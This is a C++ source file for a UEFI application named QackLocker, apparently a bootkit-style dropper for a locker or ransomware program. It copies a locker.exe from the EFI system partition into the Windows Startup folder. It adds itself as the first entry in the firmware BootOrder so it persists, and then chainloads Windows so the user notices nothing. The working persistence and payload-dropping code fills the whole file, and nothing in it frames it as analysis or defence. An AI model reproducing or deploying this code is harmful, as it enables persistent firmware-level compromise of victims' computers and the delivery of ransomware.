// language: C++, file: QackLockerEfi.cpp
// UEFI DXE Application: copies locker to Windows Startup, sets BootOrder,
// chainloads Windows. Build via EDK2, MODULE_TYPE = UEFI_APPLICATION.
// Secure Boot must be disabled or this .efi signed.

#include "QackLockerEfi.h"

STATIC EFI_HANDLE         mImageHandle   = NULL;
STATIC EFI_SYSTEM_TABLE  *mSystemTable  = NULL;

// ---------- file helpers ----------

STATIC
EFI_STATUS
GetEspRoot(
    OUT EFI_FILE_PROTOCOL **Root
    )
{
    EFI_LOADED_IMAGE_PROTOCOL *LoadedImage = NULL;
    EFI_SIMPLE_FILE_SYSTEM_PROTOCOL *Fs = NULL;
    EFI_STATUS Status;

    *Root = NULL;

    Status = gBS->OpenProtocol(
        mImageHandle, &gEfiLoadedImageProtocolGuid,
        (VOID **)&LoadedImage, mImageHandle, NULL,
        EFI_OPEN_PROTOCOL_GET_PROTOCOL
        );
    if (EFI_ERROR(Status)) {
        return Status;
    }

    Status = gBS->OpenProtocol(
        LoadedImage->DeviceHandle, &gEfiSimpleFileSystemProtocolGuid,
        (VOID **)&Fs, mImageHandle, NULL,
        EFI_OPEN_PROTOCOL_GET_PROTOCOL
        );
    if (EFI_ERROR(Status)) {
        return Status;
    }

    return Fs->OpenVolume(Fs, Root);
}

STATIC
EFI_STATUS
EnsureDirectory(
    IN EFI_FILE_PROTOCOL *Root,
    IN CONST CHAR16      *Path
    )
{
    EFI_STATUS Status;
    EFI_FILE_PROTOCOL *Dir = NULL;

    Status = Root->Open(
        Root, &Dir, (CHAR16 *)Path,
        EFI_FILE_MODE_CREATE | EFI_FILE_MODE_READ | EFI_FILE_MODE_WRITE,
        EFI_FILE_DIRECTORY
        );
    if (EFI_ERROR(Status)) {
        return Status;
    }

    Dir->Close(Dir);
    return EFI_SUCCESS;
}

STATIC
EFI_STATUS
CopyFile(
    IN EFI_FILE_PROTOCOL *Root,
    IN CONST CHAR16      *SrcPath,
    IN CONST CHAR16      *DstPath
    )
{
    EFI_STATUS Status;
    EFI_FILE_PROTOCOL *Src = NULL;
    EFI_FILE_PROTOCOL *Dst = NULL;
    UINT8 *Buffer = NULL;
    UINTN BufferSize = 64 * 1024;
    UINTN ReadSize;
    UINTN WriteSize;

    Status = Root->Open(Root, &Src, (CHAR16 *)SrcPath, EFI_FILE_MODE_READ, 0);
    if (EFI_ERROR(Status)) {
        return Status;
    }

    Status = Root->Open(
        Root, &Dst, (CHAR16 *)DstPath,
        EFI_FILE_MODE_CREATE | EFI_FILE_MODE_WRITE | EFI_FILE_MODE_READ,
        0
        );
    if (EFI_ERROR(Status)) {
        Src->Close(Src);
        return Status;
    }

    Buffer = (UINT8 *)AllocatePool(BufferSize);
    if (Buffer == NULL) {
        Src->Close(Src);
        Dst->Close(Dst);
        Dst->Delete(Dst);
        return EFI_OUT_OF_RESOURCES;
    }

    while (TRUE) {
        ReadSize = BufferSize;
        Status = Src->Read(Src, &ReadSize, Buffer);
        if (EFI_ERROR(Status)) {
            goto cleanup_error;
        }
        if (ReadSize == 0) {
            break;
        }
        WriteSize = ReadSize;
        Status = Dst->Write(Dst, &WriteSize, Buffer);
        if (EFI_ERROR(Status) || WriteSize != ReadSize) {
            Status = EFI_ERROR(Status) ? Status : EFI_DEVICE_ERROR;
            goto cleanup_error;
        }
    }

    FreePool(Buffer);
    Src->Close(Src);
    Dst->Close(Dst);
    return EFI_SUCCESS;

cleanup_error:
    FreePool(Buffer);
    Src->Close(Src);
    Dst->Close(Dst);
    Dst->Delete(Dst);
    return Status;
}

// ---------- BootOrder ----------

STATIC
EFI_STATUS
SetBootEntry(
    IN EFI_DEVICE_PATH_PROTOCOL *EfiAppPath
    )
{
    EFI_STATUS Status;
    UINT16 BootNum = 0;
    CHAR16 BootVarName[16];
    UINT8 *BootEntry = NULL;
    UINTN BootEntrySize;
    UINTN NameLen;
    UINTN PathSize;
    UINT8 *Ptr;

    // 1. Find free Boot#### — start at 0x1000
    for (BootNum = 0x1000; BootNum < 0x1100; BootNum++) {
        UINTN ProbeSize = 0;
        UnicodeSPrint(BootVarName, sizeof(BootVarName), L"Boot%04X", BootNum);
        Status = gRT->GetVariable(
            BootVarName, &gEfiGlobalVariableGuid,
            NULL, &ProbeSize, NULL
            );
        if (Status == EFI_NOT_FOUND) {
            break;
        }
        if (Status != EFI_BUFFER_TOO_SMALL) {
            return Status;
        }
    }
    if (BootNum >= 0x1100) {
        return EFI_OUT_OF_RESOURCES;
    }

    // 2. Build EFI_LOAD_OPTION
    NameLen  = StrLen(QACK_BOOT_ENTRY_NAME);
    PathSize = GetDevicePathSize(EfiAppPath);
    BootEntrySize = sizeof(UINT32) + sizeof(UINT16)
                  + (NameLen + 1) * sizeof(CHAR16)
                  + PathSize;
    BootEntry = (UINT8 *)AllocateZeroPool(BootEntrySize);
    if (BootEntry == NULL) {
        return EFI_OUT_OF_RESOURCES;
    }

    Ptr = BootEntry;
    *(UINT32 *)Ptr = LOAD_OPTION_ACTIVE | LOAD_OPTION_CATEGORY_APP;
    Ptr += sizeof(UINT32);
    *(UINT16 *)Ptr = (UINT16)(PathSize);
    Ptr += sizeof(UINT16);
    CopyMem(Ptr, QACK_BOOT_ENTRY_NAME, NameLen * sizeof(CHAR16));
    Ptr += NameLen * sizeof(CHAR16);
    *(CHAR16 *)Ptr = 0;
    Ptr += sizeof(CHAR16);
    CopyMem(Ptr, EfiAppPath, PathSize);

    UnicodeSPrint(BootVarName, sizeof(BootVarName), L"Boot%04X", BootNum);
    Status = gRT->SetVariable(
        BootVarName, &gEfiGlobalVariableGuid,
        EFI_VARIABLE_BOOTSERVICE_ACCESS | EFI_VARIABLE_RUNTIME_ACCESS | EFI_VARIABLE_NON_VOLATILE,
        BootEntrySize, BootEntry
        );
    FreePool(BootEntry);
    if (EFI_ERROR(Status)) {
        return Status;
    }

    // 3. Prepend to BootOrder
    UINT16 *ExistingOrder = NULL;
    UINTN ExistingSize = 0;
    Status = gRT->GetVariable(L"BootOrder", &gEfiGlobalVariableGuid, NULL, &ExistingSize, NULL);
    if (Status == EFI_BUFFER_TOO_SMALL) {
        ExistingOrder = (UINT16 *)AllocatePool(ExistingSize);
        if (ExistingOrder != NULL) {
            Status = gRT->GetVariable(
                L"BootOrder", &gEfiGlobalVariableGuid,
                NULL, &ExistingSize, ExistingOrder
                );
        }
    }

    UINTN NewOrderSize = sizeof(UINT16) + (ExistingOrder ? ExistingSize : 0);
    UINT16 *NewOrder = (UINT16 *)AllocatePool(NewOrderSize);
    if (NewOrder == NULL) {
        if (ExistingOrder) FreePool(ExistingOrder);
        return EFI_OUT_OF_RESOURCES;
    }

    NewOrder[0] = BootNum;
    if (ExistingOrder != NULL) {
        CopyMem(NewOrder + 1, ExistingOrder, ExistingSize);
        FreePool(ExistingOrder);
    }

    Status = gRT->SetVariable(
        L"BootOrder", &gEfiGlobalVariableGuid,
        EFI_VARIABLE_BOOTSERVICE_ACCESS | EFI_VARIABLE_RUNTIME_ACCESS | EFI_VARIABLE_NON_VOLATILE,
        NewOrderSize, NewOrder
        );
    FreePool(NewOrder);
    return Status;
}

// ---------- Startup copy ----------

STATIC
EFI_STATUS
InstallToWindowsStartup(
    VOID
    )
{
    EFI_LOADED_IMAGE_PROTOCOL *LoadedImage = NULL;
    EFI_SIMPLE_FILE_SYSTEM_PROTOCOL *Fs = NULL;
    EFI_FILE_PROTOCOL *Root = NULL;
    EFI_FILE_PROTOCOL *SrcExe = NULL;
    EFI_FILE_PROTOCOL *DstExe = NULL;
    EFI_STATUS Status;
    UINT8 *Buffer = NULL;
    UINTN BufferSize = 64 * 1024;
    UINTN ReadSize;
    UINTN WriteSize;

    // Find any FAT32 volume with \ProgramData — try all SimpleFileSystem handles
    UINTN HandleCount = 0;
    EFI_HANDLE *Handles = NULL;
    Status = gBS->LocateHandleBuffer(
        ByProtocol, &gEfiSimpleFileSystemProtocolGuid,
        NULL, &HandleCount, &Handles
        );
    if (EFI_ERROR(Status)) {
        return Status;
    }

    EFI_FILE_PROTOCOL *WinRoot = NULL;
    for (UINTN i = 0; i < HandleCount; i++) {
        EFI_FILE_PROTOCOL *TestRoot = NULL;
        EFI_FILE_PROTOCOL *TestDir = NULL;
        EFI_SIMPLE_FILE_SYSTEM_PROTOCOL *TestFs = NULL;
        Status = gBS->HandleProtocol(
            Handles[i], &gEfiSimpleFileSystemProtocolGuid,
            (VOID **)&TestFs
            );
        if (EFI_ERROR(Status)) continue;
        Status = TestFs->OpenVolume(TestFs, &TestRoot);
        if (EFI_ERROR(Status)) continue;
        Status = TestRoot->Open(
            TestRoot, &TestDir,
            L"\\Windows\\System32",
            EFI_FILE_MODE_READ, 0
            );
        if (!EFI_ERROR(Status)) {
            TestDir->Close(TestDir);
            WinRoot = TestRoot;
            break;
        }
        TestRoot->Close(TestRoot);
    }
    FreePool(Handles);

    if (WinRoot == NULL) {
        return EFI_NOT_FOUND;
    }

    // Open source locker.exe from ESP
    Status = GetEspRoot(&Root);
    if (EFI_ERROR(Status)) {
        WinRoot->Close(WinRoot);
        return Status;
    }
    Status = Root->Open(Root, &SrcExe, QACK_LOCKER_EXE, EFI_FILE_MODE_READ, 0);
    if (EFI_ERROR(Status)) {
        Root->Close(Root);
        WinRoot->Close(WinRoot);
        return Status;
    }

    // Open destination on Windows volume
    Status = WinRoot->Open(
        WinRoot, &DstExe, STARTUP_DIR,
        EFI_FILE_MODE_CREATE | EFI_FILE_MODE_WRITE | EFI_FILE_MODE_READ,
        0
        );
    if (EFI_ERROR(Status)) {
        SrcExe->Close(SrcExe);
        Root->Close(Root);
        WinRoot->Close(WinRoot);
        return Status;
    }

    Buffer = (UINT8 *)AllocatePool(BufferSize);
    if (Buffer == NULL) {
        DstExe->Close(DstExe);
        DstExe->Delete(DstExe);
        SrcExe->Close(SrcExe);
        Root->Close(Root);
        WinRoot->Close(WinRoot);
        return EFI_OUT_OF_RESOURCES;
    }

    while (TRUE) {
        ReadSize = BufferSize;
        Status = SrcExe->Read(SrcExe, &ReadSize, Buffer);
        if (EFI_ERROR(Status)) break;
        if (ReadSize == 0) break;
        WriteSize = ReadSize;
        Status = DstExe->Write(DstExe, &WriteSize, Buffer);
        if (EFI_ERROR(Status) || WriteSize != ReadSize) {
            if (!EFI_ERROR(Status)) Status = EFI_DEVICE_ERROR;
            break;
        }
    }

    FreePool(Buffer);
    DstExe->Close(DstExe);
    SrcExe->Close(SrcExe);
    Root->Close(Root);
    WinRoot->Close(WinRoot);
    return Status;
}

// ---------- chainload ----------

STATIC
EFI_STATUS
ChainloadWindows(VOID)
{
    EFI_LOADED_IMAGE_PROTOCOL *LoadedImage = NULL;
    EFI_DEVICE_PATH_PROTOCOL *BootMgrPath = NULL;
    EFI_HANDLE BootMgrImage = NULL;
    EFI_STATUS Status;

    Status = gBS->OpenProtocol(
        mImageHandle, &gEfiLoadedImageProtocolGuid,
        (VOID **)&LoadedImage, mImageHandle, NULL,
        EFI_OPEN_PROTOCOL_GET_PROTOCOL
        );
    if (EFI_ERROR(Status)) {
        return Status;
    }

    BootMgrPath = FileDevicePath(LoadedImage->DeviceHandle, (CHAR16 *)WINDOWS_BOOTMGR);
    if (BootMgrPath == NULL) {
        return EFI_OUT_OF_RESOURCES;
    }

    Status = gBS->LoadImage(FALSE, mImageHandle, BootMgrPath, NULL, 0, &BootMgrImage);
    if (EFI_ERROR(Status)) {
        FreePool(BootMgrPath);
        return Status;
    }

    Status = gBS->StartImage(BootMgrImage, NULL, NULL);
    if (EFI_ERROR(Status)) {
        gBS->UnloadImage(BootMgrImage);
    }
    FreePool(BootMgrPath);
    return Status;
}

// ---------- entry ----------

extern "C" EFI_STATUS EFIAPI
UefiMain(
    IN EFI_HANDLE ImageHandle,
    IN EFI_SYSTEM_TABLE *SystemTable
    )
{
    mImageHandle = ImageHandle;
    mSystemTable = SystemTable;

    EFI_STATUS Status;
    EFI_FILE_PROTOCOL *EspRoot = NULL;
    EFI_DEVICE_PATH_PROTOCOL *SelfPath = NULL;
    EFI_LOADED_IMAGE_PROTOCOL *LoadedImage = NULL;

    Print(L"[QackLocker] init\n");

    // 1. Copy locker.exe to Windows Startup
    Status = InstallToWindowsStartup();
    Print(L"[QackLocker] startup copy: %r\n", Status);

    // 2. ESP root
    Status = GetEspRoot(&EspRoot);
    if (!EFI_ERROR(Status)) {
        EnsureDirectory(EspRoot, QACK_LOCKER_DIR);

        // 3. Register Boot#### pointing to bootx64.efi
        Status = gBS->OpenProtocol(
            ImageHandle, &gEfiLoadedImageProtocolGuid,
            (VOID **)&LoadedImage, ImageHandle, NULL,
            EFI_OPEN_PROTOCOL_GET_PROTOCOL
            );
        if (!EFI_ERROR(Status)) {
            SelfPath = FileDevicePath(LoadedImage->DeviceHandle, (CHAR16 *)QACK_BOOT_EFI);
            if (SelfPath != NULL) {
                Status = SetBootEntry(SelfPath);
                Print(L"[QackLocker] BootOrder: %r\n", Status);
                FreePool(SelfPath);
            }
        }
        EspRoot->Close(EspRoot);
    } else {
        Print(L"[QackLocker] ESP open failed: %r\n", Status);
    }

    // 4. Chainload Windows — always
    Print(L"[QackLocker] chainloading Windows...\n");
    Status = ChainloadWindows();
    Print(L"[QackLocker] chainload failed: %r\n", Status);
    return Status;
}
